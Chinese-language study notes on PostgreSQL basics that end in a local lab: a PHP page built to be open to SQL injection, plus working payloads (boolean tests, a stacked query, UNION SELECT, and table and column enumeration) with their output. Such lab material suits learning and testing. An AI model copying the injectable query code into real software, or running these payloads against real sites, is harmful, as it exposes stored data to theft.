## 数据库逻辑结构

数据库 database

表，索引   table

数据行   Tuple   row

数据列 column

### 数据库的操作

#### 1.创建数据库

create database dname;

#### 2.修改数据库

ALTER DATABASE dname[[WITH] option [....] ];

#### 3.删除数据库

DROP DATABASE dname;



### 模式

#### 1.模式定义

schema 模式：命名空间或者目录，便于管理，调用

#### 2.模式的使用

CREATE SCHEMA schema_name [ AUTHORIZATION username ] [ schema_element [ .... ] ]

#### 3.公共模式

创建或者访问模式中的对象 

schema_name.table_name

#### 4.约束

约束分类：检查约束，非空约束，唯一约束，主键，外键

检查约束 ： column_name TYPE CHECK( condition ),

非空约束： column_name TYPE not null,

唯一约束： column_name TYPE UNIQUE,

主键约束： column_name TYPE primary key,

外键约束： column_name TYPE REFERENCES class(class_name)

### 表

#### 1.创建表

CREATE TABLE table_name(

column_name1 type1 [ primary key] ,

column_name2 type2,

.........

)

#### 2.修改表

##### 增加字段

ALTER TABLE table_name ADD COLUMN column_name TYPE;

##### 删除字段

ALTER TABLE table_name DROP COLUMN column_name;

##### 增加约束

ALTER TABLE table_name ADD CHECK （condition）;

ALTER TABLE table_name ADD CONSTRAINT constraint_name UNIQUE ;



### 触发器

由时间自动触发执行的特尔书的存储过程，可以对INSERT UPDATE DELETE等操作







### 应用实例：

msfconsole 连接PostgreSQL

```
postgres=# create user "jambolt" with password'123456' nocreatedb;
CREATE ROLE
postgres=# create database "msf" with owner="jambolt";
CREATE DATABASE

msf5 > db_connect jambolt:123456@127.0.0.1/msf
Connected to Postgres data service: 127.0.0.1/msf
msf5 > db_status 
[*] Connected to msf. Connection type: postgresql. Connection name: Cc4aBkaZ.
```



与apache2，php 一起使用

> 参考 https://www.yiibai.com/postgresql/postgresql_php.html  PHP连接PostgreSQL数据库

```
jambolt@jambolt-virtual-machine:~$ sudo apt-get install apache2 -y
jambolt@jambolt-virtual-machine:~$ sudo apt-get install php7.0 php7.0-pgsql
jambolt@jambolt-virtual-machine:~$ sudo apt-get install libapache2-mod-php
apache2 restart
```

创建test.php文件

```
<?php
   $host        = "host=127.0.0.1";
   $port        = "port=5432";
   $dbname      = "dbname=postgres";
   $credentials = "user=postgres password=postgres";

   $db = pg_connect( "$host $port $dbname $credentials"  );
   if(!$db){
      echo "Error : Unable to open database\n";
   } else {
      echo "Opened database successfully\n";
   }

   $sql =<<<EOF
      CREATE TABLE COMPANY
      (ID INT PRIMARY KEY     NOT NULL,
      NAME           TEXT    NOT NULL,
      AGE            INT     NOT NULL,
      ADDRESS        CHAR(50),
      SALARY         REAL);
EOF;

   $ret = pg_query($db, $sql);
   if(!$ret){
      echo pg_last_error($db);
   } else {
      echo "Table created successfully\n";
   }
   pg_close($db);
?>
```

访问test.php后查询psql

```
postgres=# \d
          List of relations
 Schema |  Name   | Type  |  Owner   
--------+---------+-------+----------
 public | company | table | postgres
 public | test    | table | postgres
(2 rows)

postgres=# select * from company;
 id | name | age | address | salary 
----+------+-----+---------+--------
(0 rows)
```

插入数据后

```
postgres=# select * from company;
 id | name  | age |                      address                       | salary 
----+-------+-----+----------------------------------------------------+--------
  1 | Paul  |  32 | California                                         |  20000
  2 | Allen |  25 | Texas                                              |  15000
  3 | Teddy |  23 | Norway                                             |  20000
  4 | Mark  |  25 | Rich-Mond                                          |  65000
(4 rows)

postgres=# select * from test;
 id | username | password 
----+----------+----------
  1 | jambolt  | 123456
(1 row)
```

写了个简易的用get参数查询的页面select.php

```
<?php
   $host        = "host=127.0.0.1";
   $port        = "port=5432";
   $dbname      = "dbname=postgres";
   $credentials = "user=postgres password=postgres";

   $db = pg_connect( "$host $port $dbname $credentials"  );
   $id = $_GET["id"];
   if(!$db){
      echo "Error : Unable to open database\n";
   } else {
      #echo "Opened database successfully\n";
   }

   $sql =<<<EOF
      SELECT * from COMPANY where id = $id ;
EOF;

   $ret = pg_query($db, $sql);
   if(!$ret){
      echo pg_last_error($db);
      exit;
   }
   while($row = pg_fetch_row($ret)){
      echo "ID = ". $row[0] . "\n";
      echo "NAME = ". $row[1] ."\n";
      echo "ADDRESS = ". $row[2] ."\n";
      echo "SALARY =  ".$row[4] ."\n\n";
   }
   #echo "Operation done successfully\n";
   pg_close($db);
?>
```

访问http://127.0.0.1/select.php?id=3-1   http://127.0.0.1/select.php?id=2 and 1=1

ID = 2 NAME = Allen ADDRESS = 25 SALARY = 15000 

堆叠注入 

 http://127.0.0.1/select.php?id=2;select * from test

ID = 1 NAME = jambolt ADDRESS = 123456 SALARY = 

联合查询

http://127.0.0.1/select.php?id=3 UNION SELECT '1','2','3','4','5'--

ID = 1 NAME = 2 ADDRESS = 3 SALARY = 5 ID = 3 NAME = Teddy ADDRESS = 23 SALARY = 20000 

查询表名

 UNION ALL SELECT NULL,tablename,NULL,NULL,NUll FROM pg_tables WHERE schemaname IN ('public')

获取字段名

```
UNION SELECT NULL,attname,NULL,NULL,NULL FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='tbuser' AND nspname='public'--
```